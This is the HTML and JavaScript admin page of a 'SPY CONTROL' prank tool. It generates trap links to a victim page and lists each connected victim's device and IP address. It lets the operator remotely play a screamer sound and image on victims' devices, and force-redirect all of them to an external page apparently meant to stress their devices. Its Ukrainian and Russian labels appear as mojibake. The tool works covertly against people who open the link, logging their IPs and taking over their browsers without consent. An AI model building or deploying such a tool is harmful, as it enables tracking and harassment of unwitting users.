<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SPY CONTROL v8.0 Optimized</title>
    <style>
        :root {
            --neon: #00ffcc;
            --neon-secondary: #00aaff;
            --danger: #ff3366;
            --bg-dark: #050507;
            --card-bg: rgba(20, 20, 25, 0.95);
            --text-color: #e0e0e0;
        }
        body { 
            background-color: var(--bg-dark); color: var(--text-color); 
            font-family: 'Segoe UI', Roboto, sans-serif; 
            margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center;
            background: radial-gradient(ellipse at bottom, #1B2735 0%, #090A0F 100%);
            overflow: hidden;
        }

        .container { 
            position: relative; z-index: 1; width: 95%; max-width: 500px; 
            background: var(--card-bg); padding: 20px; border-radius: 20px; 
            border: 1px solid rgba(0, 255, 204, 0.15);
            backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
            max-height: 95vh; overflow-y: auto;
        }

        /* --- STYLES FOR PROGRESS OVERLAY --- */
        #progress-overlay {
            display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.85); z-index: 100; border-radius: 20px;
            flex-direction: column; justify-content: center; align-items: center;
        }
        .progress-box { width: 80%; text-align: center; }
        .progress-bar-bg {
            width: 100%; height: 20px; background: #222; border-radius: 10px;
            border: 1px solid #444; overflow: hidden; margin-top: 10px; position: relative;
        }
        .progress-fill {
            height: 100%; width: 0%; background: var(--neon);
            box-shadow: 0 0 10px var(--neon); transition: width 0.1s linear;
        }
        .progress-text { margin-top: 5px; color: var(--neon); font-weight: bold; font-size: 14px; }

        /* General UI */
        .lang-bar { display: flex; justify-content: center; gap: 8px; margin-bottom: 15px; }
        .lang-btn { background: rgba(255,255,255,0.05); border: 1px solid #333; color: #888; padding: 5px 10px; border-radius: 8px; cursor: pointer; font-size: 11px; }
        .lang-btn.active { border-color: var(--neon); color: var(--bg-dark); background: var(--neon); }

        h1 { font-size: 20px; text-transform: uppercase; text-align: center; color: var(--neon); letter-spacing: 2px; margin-bottom: 15px; }

        .mode-switch { display: flex; gap: 10px; margin-bottom: 15px; background: #000; padding: 5px; border-radius: 10px; }
        .mode-btn { flex: 1; border: none; background: transparent; color: #555; padding: 8px; border-radius: 8px; cursor: pointer; font-size: 11px; font-weight: bold; transition: 0.3s; }
        .mode-btn.active { background: #222; color: var(--neon); box-shadow: 0 0 10px rgba(0,255,204,0.1); }

        .input-box { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #222; position: relative; }
        input[type="text"] { width: 100%; padding: 10px; background: #000; border: 1px solid #333; color: white; border-radius: 8px; box-sizing: border-box; font-size: 12px; margin: 5px 0; }
        
        input[type="file"] { display: none; }
        .file-label { display: block; width: 100%; padding: 10px; text-align: center; background: #111; border: 1px dashed #444; border-radius: 8px; color: #888; cursor: pointer; font-size: 11px; margin-top: 5px; }
        .file-label.file-selected { border-color: var(--neon-secondary); color: var(--neon-secondary); background: rgba(0,170,255,0.1); }

        .input-wrapper { display: flex; gap: 5px; align-items: center; position: relative; }
        .input-wrapper input { flex-grow: 1; }

        .sound-menu-btn { background: #222; border: 1px solid var(--neon-secondary); color: var(--neon-secondary); border-radius: 8px; width: 40px; height: 38px; display: flex; justify-content: center; align-items: center; cursor: pointer; font-size: 18px; }
        .sound-dropdown { display: none; position: absolute; top: 45px; right: 0; width: 100%; background: #151515; border: 1px solid var(--neon-secondary); border-radius: 10px; z-index: 999; max-height: 200px; overflow-y: auto; box-shadow: 0 5px 20px rgba(0,0,0,0.8); }
        .sound-dropdown.show { display: block; }
        .sound-item { padding: 8px; border-bottom: 1px solid #222; font-size: 11px; cursor: pointer; color: #ccc; display: flex; justify-content: space-between; align-items: center; }
        .preview-btn { font-size: 10px; padding: 2px 5px; border: 1px solid #555; background: black; color: white; margin-left: 10px; cursor: pointer; }

        button.main-btn { width: 100%; padding: 12px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; text-transform: uppercase; margin-top: 8px; font-size: 13px; }
        .btn-create { background: var(--neon); color: black; }
        .btn-update { background: #222; color: var(--neon); border: 1px solid var(--neon); }
        
        .btn-scare { background: #333; color: #555; height: 60px; font-size: 18px; cursor: not-allowed; margin-top: 15px; }
        .btn-scare.ready { background: var(--danger); color: white; cursor: pointer; animation: pulse 2s infinite; }
        
        .btn-bomb { background: repeating-linear-gradient(45deg, #000, #000 10px, #330000 10px, #330000 20px); color: var(--danger); border: 2px solid var(--danger); margin-top: 10px; height: 45px; cursor: not-allowed; opacity: 0.5; }
        .btn-bomb.ready { cursor: pointer; opacity: 1; }
        
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.03); } 100% { transform: scale(1); } }
        
        .hidden { display: none !important; }
        .lbl-title { font-size: 10px; font-weight: bold; color: var(--neon-secondary); display: block; margin-bottom: 4px; }
    </style>
</head>
<body>
    <div class="container">
        <div id="progress-overlay">
            <div class="progress-box">
                <div style="color:white; font-size:12px; margin-bottom:5px;">UPLOADING FILES...</div>
                <div class="progress-bar-bg">
                    <div class="progress-fill" id="p-fill"></div>
                </div>
                <div class="progress-text" id="p-text">0%</div>
            </div>
        </div>

        <div class="lang-bar">
            <button class="lang-btn" onclick="setLang('uk')">UA</button>
            <button class="lang-btn" onclick="setLang('ru')">RU</button>
            <button class="lang-btn" onclick="setLang('en')">EN</button>
        </div>

        <h1 id="txt-title">üëÅÔ∏è SPY CONTROL</h1>

        <div id="setup-step">
            <div class="mode-switch">
                <button class="mode-btn active" onclick="setMode('url')" id="btn-mode-url">üåê URL LINK</button>
                <button class="mode-btn" onclick="setMode('file')" id="btn-mode-file">üìÅ UPLOAD FILE</button>
            </div>

            <div class="input-box">
                <span class="lbl-title" id="lbl-img">–ó–û–ë–†–ê–ñ–ï–ù–ù–Ø</span>
                <input type="text" id="imgUrl" class="inp-url" placeholder="https://site.com/image.jpg">
                <label for="imgFile" id="lbl-imgFile" class="file-label inp-file hidden">–í–∏–±—Ä–∞—Ç–∏ —Ñ–æ—Ç–æ</label>
                <input type="file" id="imgFile" class="inp-file hidden" accept="image/*" onchange="updLbl(this, 'lbl-imgFile')">
            </div>

            <div class="input-box">
                <span class="lbl-title" id="lbl-snd">–ó–í–£–ö</span>
                <div class="input-wrapper inp-url">
                    <input type="text" id="sndUrl" value="https://soundbible.com/grab.php?id=1549&type=mp3">
                    <div class="sound-menu-btn" onclick="toggleMenu('create')">‚ò∞</div>
                    <div id="menu-create" class="sound-dropdown"></div>
                </div>
                <label for="sndFile" id="lbl-sndFile" class="file-label inp-file hidden">–í–∏–±—Ä–∞—Ç–∏ MP3</label>
                <input type="file" id="sndFile" class="inp-file hidden" accept="audio/*" onchange="updLbl(this, 'lbl-sndFile')">
            </div>

            <button class="main-btn btn-create" onclick="handleCreate()" id="btn-create">–°–¢–í–û–†–ò–¢–ò</button>
        </div>

        <div id="control-panel" style="display:none;">
            <div style="text-align:center; margin:10px 0; font-size:11px; background:#000; padding:10px; border-radius:8px;">
                <a id="victim-link" href="#" target="_blank" style="color:var(--neon-secondary);">...</a>
            </div>
            
            <div class="input-box" style="border-color: var(--neon);">
                <span class="lbl-title" id="lbl-upd" style="color:var(--neon)">–û–ù–û–í–ò–¢–ò –ö–û–ù–¢–ï–ù–¢</span>
                 <div style="margin-bottom:8px;">
                    <input type="text" id="updImgUrl" placeholder="Image URL">
                    <label for="updImgFile" id="lbl-updImg" class="file-label" style="font-size:10px;">+ –§–û–¢–û / PHOTO</label>
                    <input type="file" id="updImgFile" accept="image/*" onchange="updLbl(this, 'lbl-updImg')">
                 </div>
                 <div>
                    <div class="input-wrapper">
                        <input type="text" id="updSndUrl" placeholder="Sound URL">
                        <div class="sound-menu-btn" onclick="toggleMenu('update')">‚ò∞</div>
                        <div id="menu-update" class="sound-dropdown"></div>
                    </div>
                    <label for="updSndFile" id="lbl-updSnd" class="file-label" style="font-size:10px;">+ MP3 / AUDIO</label>
                    <input type="file" id="updSndFile" accept="audio/*" onchange="updLbl(this, 'lbl-updSnd')">
                 </div>
                <button class="main-btn btn-update" onclick="handleUpdate()" id="btn-update">–û–ù–û–í–ò–¢–ò</button>
            </div>

            <div id="users-list" style="min-height: 20px;"></div>
            <button id="scare-btn" class="main-btn btn-scare" onclick="triggerScare()" disabled>SCREAMER üíÄ</button>
            <button id="bomb-btn" class="main-btn btn-bomb" onclick="triggerBomb()" disabled>‚ò¢Ô∏è BOMBARDIO ‚ò¢Ô∏è</button>
            <button onclick="location.reload()" style="background:transparent; color:#555; border:none; margin-top:10px; width:100%; font-size:10px;">‚¨Ö MENU</button>
        </div>

        <div id="history-panel">
            <h3 id="txt-hist" style="font-size:11px; color:#444; margin-top:15px; border-top:1px solid #222; padding-top:10px;">–Ü–°–¢–û–†–Ü–Ø / HISTORY</h3>
            <div id="history-list"></div>
        </div>
    </div>

    <audio id="preview-audio"></audio>
    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        let curSess = null;
        let mode = 'url';
        
        // --- TRANSLATIONS ---
        const i18n = {
            uk: { t:"üëÅÔ∏è SPY CONTROL", b1:"üåê –ü–û–°–ò–õ–ê–ù–ù–Ø", b2:"üìÅ –§–ê–ô–õ", li:"–ó–û–ë–†–ê–ñ–ï–ù–ù–Ø", ls:"–ó–í–£–ö", fi:"–í–∏–±—Ä–∞—Ç–∏ —Ñ–æ—Ç–æ", fs:"–í–∏–±—Ä–∞—Ç–∏ MP3", bc:"–°–¢–í–û–†–ò–¢–ò –ü–ê–°–¢–ö–£", bu:"–û–ù–û–í–ò–¢–ò –ó–ê–†–ê–ó", lu:"–û–ù–û–í–ò–¢–ò –ö–û–ù–¢–ï–ù–¢", bs:"–ù–ê–õ–Ø–ö–ê–¢–ò üíÄ", bb:"‚ò¢Ô∏è –ë–û–ú–ë–ê–†–î–£–í–ê–ù–ù–Ø ‚ò¢Ô∏è", h:"–Ü–°–¢–û–†–Ü–Ø", warn:"‚ö†Ô∏è –£–í–ê–ì–ê! –í—Å—ñ—Ö –ø–µ—Ä–µ–∫–∏–Ω–µ –Ω–∞ –ø—Ä–∞–Ω–∫ —Å–∞–π—Ç!", ln:"üöÄ –ó–ê–ü–£–©–ï–ù–û!" },
            ru: { t:"üëÅÔ∏è –®–ü–ò–û–ù –ö–û–ù–¢–†–û–õ–¨", b1:"üåê –°–°–´–õ–ö–ê", b2:"üìÅ –§–ê–ô–õ", li:"–ò–ó–û–ë–†–ê–ñ–ï–ù–ò–ï", ls:"–ó–í–£–ö", fi:"–í—ã–±—Ä–∞—Ç—å —Ñ–æ—Ç–æ", fs:"–í—ã–±—Ä–∞—Ç—å MP3", bc:"–°–û–ó–î–ê–¢–¨ –õ–û–í–£–®–ö–£", bu:"–û–ë–ù–û–í–ò–¢–¨ –°–ï–ô–ß–ê–°", lu:"–û–ë–ù–û–í–ò–¢–¨ –ö–û–ù–¢–ï–ù–¢", bs:"–ù–ê–ü–£–ì–ê–¢–¨ üíÄ", bb:"‚ò¢Ô∏è –ë–û–ú–ë–ê–†–î–ò–†–û–í–ö–ê ‚ò¢Ô∏è", h:"–ò–°–¢–û–†–ò–Ø", warn:"‚ö†Ô∏è –í–ù–ò–ú–ê–ù–ò–ï! –í—Å–µ—Ö –ø–µ—Ä–µ–∫–∏–Ω–µ—Ç –Ω–∞ –ø—Ä–∞–Ω–∫ —Å–∞–π—Ç!", ln:"üöÄ –ó–ê–ü–£–©–ï–ù–û!" },
            en: { t:"üëÅÔ∏è SPY CONTROL", b1:"üåê URL LINK", b2:"üìÅ UPLOAD FILE", li:"IMAGE", ls:"SOUND", fi:"Select Image", fs:"Select Audio", bc:"CREATE TRAP", bu:"UPDATE NOW", lu:"LIVE UPDATE", bs:"SCREAMER üíÄ", bb:"‚ò¢Ô∏è BOMBARDIO ‚ò¢Ô∏è", h:"HISTORY", warn:"‚ö†Ô∏è Redirect everyone?", ln:"üöÄ LAUNCHED!" }
        };
        let lang = 'uk';

        function setLang(l) {
            lang = l;
            const t = i18n[l];
            document.getElementById('txt-title').innerText = t.t;
            document.getElementById('btn-mode-url').innerText = t.b1;
            document.getElementById('btn-mode-file').innerText = t.b2;
            document.getElementById('lbl-img').innerText = t.li;
            document.getElementById('lbl-snd').innerText = t.ls;
            if(!document.getElementById('imgFile').value) document.getElementById('lbl-imgFile').innerText = t.fi;
            if(!document.getElementById('sndFile').value) document.getElementById('lbl-sndFile').innerText = t.fs;
            document.getElementById('btn-create').innerText = t.bc;
            document.getElementById('lbl-upd').innerText = t.lu;
            document.getElementById('btn-update').innerText = t.bu;
            if(!document.getElementById('scare-btn').disabled) document.getElementById('scare-btn').innerText = t.bs;
            document.getElementById('bomb-btn').innerText = t.bb;
            document.getElementById('txt-hist').innerText = t.h;
        }

        // --- SOUNDS ---
        const sounds = [
            {n:"–°–∞—Ñ–æ–Ω–æ–≤ –û–ø–ª–∞—Ç–∏—Ç—å", u:"https://www.myinstants.com/media/sounds/safonov-oplatit.mp3"},
            {n:"–ß—É–≥—É–Ω", u:"https://www.myinstants.com/media/sounds/chugun.mp3"},
            {n:"–ö—Ä—è–∫–∞–ª–∫–∞ –î–ü–°", u:"https://www.myinstants.com/media/sounds/kriakalka-dps-no-2.mp3"},
            {n:"–Å–ë*–´–ô –í –†–û–û–¢", u:"https://www.myinstants.com/media/sounds/iobanyi-v-rot.mp3"},
            {n:"Screamer 1", u:"https://www.myinstants.com/media/sounds/scream_horror1.mp3"},
            {n:"–°—Ç—É–∫ –≤ –¥–≤–µ—Ä—å", u:"https://www.myinstants.com/media/sounds/knocking-on-door.mp3"}
        ];

        function renderMenus() {
            ['create', 'update'].forEach(t => {
                const c = document.getElementById(`menu-${t}`);
                const inp = t==='create'?'sndUrl':'updSndUrl';
                c.innerHTML = sounds.map(s => `
                    <div class="sound-item">
                        <span onclick="pickSound('${inp}','${s.u}','menu-${t}')" style="flex:1">${s.n}</span>
                        <button class="preview-btn" onclick="playP('${s.u}', event)">‚ñ∂</button>
                    </div>`).join('');
            });
        }
        function pickSound(id, url, mid) { document.getElementById(id).value = url; document.getElementById(mid).classList.remove('show'); }
        function toggleMenu(t) { 
            const m = document.getElementById(`menu-${t}`);
            const s = m.classList.contains('show');
            document.querySelectorAll('.sound-dropdown').forEach(e=>e.classList.remove('show'));
            if(!s) m.classList.add('show');
        }
        function playP(u, e) { e.stopPropagation(); const a = document.getElementById('preview-audio'); a.src=u; a.volume=0.5; a.play(); }
        window.onclick = e => { if(!e.target.closest('.sound-menu-btn') && !e.target.closest('.preview-btn')) document.querySelectorAll('.sound-dropdown').forEach(m=>m.classList.remove('show')); };

        // --- LOGIC ---
        function setMode(m) {
            mode = m;
            document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
            document.getElementById(`btn-mode-${m}`).classList.add('active');
            const u = document.querySelectorAll('.inp-url');
            const f = document.querySelectorAll('.inp-file');
            if(m==='url') { u.forEach(e=>e.classList.remove('hidden')); f.forEach(e=>e.classList.add('hidden')); }
            else { u.forEach(e=>e.classList.add('hidden')); f.forEach(e=>e.classList.remove('hidden')); }
        }

        function updLbl(inp, id) {
            const l = document.getElementById(id);
            if(inp.files.length) { l.innerText = "‚úì " + inp.files[0].name; l.classList.add('file-selected'); }
            else { l.innerText = "..."; l.classList.remove('file-selected'); }
        }

        // --- OPTIMIZED UPLOAD WITH PROGRESS ---
        function upload(url, fd) {
            return new Promise((res, rej) => {
                const xhr = new XMLHttpRequest();
                const overlay = document.getElementById('progress-overlay');
                const fill = document.getElementById('p-fill');
                const txt = document.getElementById('p-text');

                overlay.style.display = 'flex'; // Show overlay
                fill.style.width = '0%';
                txt.innerText = '0%';

                xhr.open('POST', url);
                xhr.upload.onprogress = e => {
                    if(e.lengthComputable) {
                        const p = Math.round((e.loaded/e.total)*100);
                        fill.style.width = p + '%';
                        txt.innerText = p + '%';
                    }
                };
                xhr.onload = () => {
                    overlay.style.display = 'none';
                    if(xhr.status >= 200 && xhr.status < 300) res(JSON.parse(xhr.response));
                    else rej(xhr.statusText);
                };
                xhr.onerror = () => { overlay.style.display='none'; rej("Net Error"); };
                xhr.send(fd);
            });
        }

        async function handleCreate() {
            try {
                if(mode==='url') {
                    const img = document.getElementById('imgUrl').value;
                    const snd = document.getElementById('sndUrl').value;
                    const r = await fetch('/create', {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:img,sound:snd})});
                    const d = await r.json();
                    activate(d.id);
                } else {
                    const i = document.getElementById('imgFile').files[0];
                    const s = document.getElementById('sndFile').files[0];
                    if(!i && !s) return alert("File needed!");
                    const fd = new FormData();
                    if(i) fd.append('images', i);
                    if(s) fd.append('sounds', s);
                    const d = await upload('/create-upload', fd);
                    activate(d.id);
                }
            } catch(e) { alert("Error: "+e); }
        }

        async function handleUpdate() {
            if(!curSess) return;
            try {
                // URL Update
                const iu = document.getElementById('updImgUrl').value;
                const su = document.getElementById('updSndUrl').value;
                if(iu || su) await fetch(`/update-session/${curSess}`, {method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({image:iu,sound:su})});
                
                // File Update
                const fi = document.getElementById('updImgFile').files[0];
                const fs = document.getElementById('updSndFile').files[0];
                if(fi) { const fd=new FormData(); fd.append('images', fi); await upload(`/session/${curSess}/upload-images`, fd); }
                if(fs) { const fd=new FormData(); fd.append('sounds', fs); await upload(`/session/${curSess}/upload-sounds`, fd); }
                
                alert("OK!");
                // Clear
                document.getElementById('updImgUrl').value=''; document.getElementById('updSndUrl').value='';
                document.getElementById('updImgFile').value=''; document.getElementById('updSndFile').value='';
            } catch(e) { alert("Error: "+e); }
        }

        function activate(id) {
            curSess = id;
            saveH(id);
            document.getElementById('setup-step').style.display='none';
            document.getElementById('control-panel').style.display='block';
            document.getElementById('history-panel').style.display='none';
            const l = `${window.location.origin}/victim.html?id=${id}`;
            document.getElementById('victim-link').href = l;
            document.getElementById('victim-link').innerText = l;
            socket.emit('join-room-admin', id);
        }

        function triggerScare() { if(curSess) socket.emit('trigger-scare', curSess); }
        function triggerBomb() { 
            if(curSess && confirm(i18n[lang].warn)) {
                socket.emit('trigger-redirect', {roomId:curSess, url:"https://prank-nfc.onrender.com/volumeshader_bm.html"});
                alert(i18n[lang].ln);
            }
        }

        socket.on('update-victim-list', u => {
            const b = document.getElementById('scare-btn');
            const bb = document.getElementById('bomb-btn');
            const l = document.getElementById('users-list');
            if(u.length){
                b.disabled=false; b.classList.add('ready'); b.innerText = i18n[lang].bs;
                bb.disabled=false; bb.classList.add('ready');
                l.innerHTML = u.map(v=>`<div style="color:var(--neon);font-size:11px;">‚óè ${v.device} [${v.ip}]</div>`).join('');
            } else {
                b.disabled=true; b.classList.remove('ready');
                bb.disabled=true; bb.classList.remove('ready');
                l.innerHTML='<div style="color:#555;font-size:11px;">Waiting...</div>';
            }
        });

        function saveH(id){ let h=JSON.parse(localStorage.getItem('sh')||'[]'); if(!h.includes(id)){h.unshift(id); localStorage.setItem('sh',JSON.stringify(h.slice(0,10)));} }
        function loadH(){ 
            const h=JSON.parse(localStorage.getItem('sh')||'[]');
            const l=document.getElementById('history-list'); l.innerHTML='';
            h.forEach(id=>{
                const d=document.createElement('div'); d.className='history-item';
                d.innerHTML=`<span style="flex:1" onclick="activate('${id}')">ID: ${id.slice(0,8)}...</span><button class="del-btn" onclick="delH('${id}',event)">‚úï</button>`;
                l.appendChild(d);
            });
        }
        function delH(id,e){ e.stopPropagation(); let h=JSON.parse(localStorage.getItem('sh')||'[]'); h=h.filter(i=>i!==id); localStorage.setItem('sh',JSON.stringify(h)); loadH(); }

        window.onload = () => { loadH(); renderMenus(); setLang('uk'); };
    </script>
</body>
</html>
